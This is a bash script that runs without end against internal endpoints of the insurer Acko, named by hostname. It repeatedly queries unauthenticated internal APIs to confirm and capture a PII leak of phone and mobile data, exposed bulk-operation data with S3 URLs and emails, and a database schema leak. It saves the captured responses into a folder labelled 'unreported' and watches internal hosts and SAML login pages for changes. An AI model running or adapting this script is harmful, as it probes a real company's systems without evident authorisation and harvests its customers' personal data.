#!/bin/bash
# CONTINUOUS ACKO VULNERABILITY PROBER
# Never stops. Finds vulns. Saves them. Repeats.
OUTDIR="/home/sricharansiddu29/recon_reports/companies/acko/unreported"
mkdir -p "$OUTDIR"

CYCLE=0
TRACK="/tmp/acko_probe_status"

while true; do
    CYCLE=$((CYCLE+1))
    TS=$(date +%Y%m%d_%H%M%S)
    
    # === PROBE ALL TARGETS ===
    echo "[$TS] Cycle $CYCLE" >> /tmp/probe_log.txt
    
    # 1. partner-portal comms query (PII leak)
    STATUS=$(curl -sk --max-time 10 -o /tmp/_pii.txt -w "%{http_code}" \
        -X POST "https://partner-portal.corp.acko.com/artemis-api/internal/communications/query" \
        -H "Content-Type: application/json" -d '{"entity_ids":["1"],"page_size":1}' 2>/dev/null)
    PII_BODY=$(cat /tmp/_pii.txt 2>/dev/null | strings | head -c 300)
    if echo "$PII_BODY" | grep -qE '"data"|"phone"|"mobile"'; then
        HASH=$(echo "$PII_BODY" | md5sum | cut -d' ' -f1)
        if [ "$(cat /tmp/_pii_hash 2>/dev/null)" != "$HASH" ]; then
            echo "$HASH" > /tmp/_pii_hash
            cat > "$OUTDIR/PII_LEAK_${TS}.md" <<- EOF
# PII Leak Still Active - partner-portal.comms.query
**Severity:** Critical  
**Time:** ${TS}  
**HTTP:** ${STATUS}  
**Response:** ${PII_BODY}
EOF
            echo "[$TS] CRITICAL: PII leak confirmed (${STATUS})" >> /tmp/probe_log.txt
        fi
    fi
    
    # 2. Bulk ops history (data exposure)
    STATUS=$(curl -sk --max-time 10 -o /tmp/_bulk.txt -w "%{http_code}" \
        "https://partner-portal.corp.acko.com/artemis-api/internal/bulk-operations/history" 2>/dev/null)
    BODY=$(cat /tmp/_bulk.txt 2>/dev/null | strings | head -c 300)
    if echo "$BODY" | grep -qiE 's3|url|email'; then
        HASH=$(echo "$BODY" | md5sum | cut -d' ' -f1)
        if [ "$(cat /tmp/_bulk_hash 2>/dev/null)" != "$HASH" ]; then
            echo "$HASH" > /tmp/_bulk_hash
            cat > "$OUTDIR/BULK_OPS_EXPOSED_${TS}.md" <<- EOF
# Bulk Operations Data Still Exposed
**Severity:** High  
**Time:** ${TS}  
**HTTP:** ${STATUS}  
**Response:** ${BODY}
EOF
            echo "[$TS] HIGH: Bulk ops data exposed (${STATUS})" >> /tmp/probe_log.txt
        fi
    fi
    
    # 3. Create order DB schema leak
    STATUS=$(curl -sk --max-time 10 -o /tmp/_order.txt -w "%{http_code}" \
        -X POST "https://partner-portal.corp.acko.com/artemis-api/partnership/payment/payin/create_order" \
        -H "Content-Type: application/json" -d '{"amount":1}' 2>/dev/null)
    BODY=$(cat /tmp/_order.txt 2>/dev/null | strings | head -c 300)
    if echo "$BODY" | grep -qiE 'payin_orders|table|column'; then
        HASH=$(echo "$BODY" | md5sum | cut -d' ' -f1)
        if [ "$(cat /tmp/_order_hash 2>/dev/null)" != "$HASH" ]; then
            echo "$HASH" > /tmp/_order_hash
            cat > "$OUTDIR/DB_SCHEMA_LEAK_${TS}.md" <<- EOF
# DB Schema Leaked via create_order
**Severity:** High  
**Time:** ${TS}  
**HTTP:** ${STATUS}  
**Response:** ${BODY}
EOF
            echo "[$TS] HIGH: DB schema leaked (${STATUS})" >> /tmp/probe_log.txt
        fi
    fi
    
    # 4. All targets status check
    for TARGET in "partner-portal.corp.acko.com" "cx360v2-backend.corp.acko.com" \
                  "central-internal-tools.corp.acko.com" "central-one-view.corp.acko.com" \
                  "auth-saml.corp.acko.com" "vendor.corp.acko.com" "fleetops.acko.com"; do
        STATUS=$(curl -skI --max-time 8 -o /dev/null -w "%{http_code}" "https://${TARGET}/" 2>/dev/null)
        PREV=$(grep "^${TARGET}|" "$TRACK" 2>/dev/null | tail -1 | cut -d'|' -f2)
        if [ -n "$PREV" ] && [ "$PREV" != "$STATUS" ]; then
            cat > "$OUTDIR/CHANGE_${TARGET}_${TS}.md" <<- EOF
# Status Change: ${TARGET}
**From:** ${PREV} -> **To:** ${STATUS}  
**Time:** ${TS}
EOF
            echo "[$TS] CHANGE: ${TARGET}: ${PREV} -> ${STATUS}" >> /tmp/probe_log.txt
        fi
        echo "${TARGET}|${STATUS}|${TS}" >> "$TRACK"
    done
    
    # 5. SAML endpoint check
    for SVC in firefly vendor-prod; do
        STATUS=$(curl -skI --max-time 8 -o /dev/null -w "%{http_code}" \
            "https://auth-saml.corp.acko.com/auth/saml/login/?service=${SVC}" 2>/dev/null)
        PREV=$(grep "^saml-${SVC}|" "$TRACK" 2>/dev/null | tail -1 | cut -d'|' -f2)
        if [ -n "$PREV" ] && [ "$PREV" != "$STATUS" ]; then
            cat > "$OUTDIR/SAML_CHANGE_${SVC}_${TS}.md" <<- EOF
# SAML Login Change: ${SVC}
**From:** ${PREV} -> **To:** ${STATUS}  
**Time:** ${TS}
EOF
        fi
        echo "saml-${SVC}|${STATUS}|${TS}" >> "$TRACK"
    done
    
    # Heartbeat every 10 cycles
    if [ $((CYCLE % 10)) -eq 0 ]; then
        TOTAL=$(ls "$OUTDIR"/*.md 2>/dev/null | wc -l)
        echo "[$TS] HEARTBEAT: Cycle ${CYCLE} | ${TOTAL} findings | PID: $$" >> /tmp/probe_log.txt
        # Update index
        printf "# Findings Index\nUpdated: %s\n\n" "$(date)" > "$OUTDIR/_INDEX.md"
        ls -1 "$OUTDIR"/*.md 2>/dev/null | while read F; do
            echo "- $(basename "$F")" >> "$OUTDIR/_INDEX.md"
        done
    fi
    
    sleep 30
done
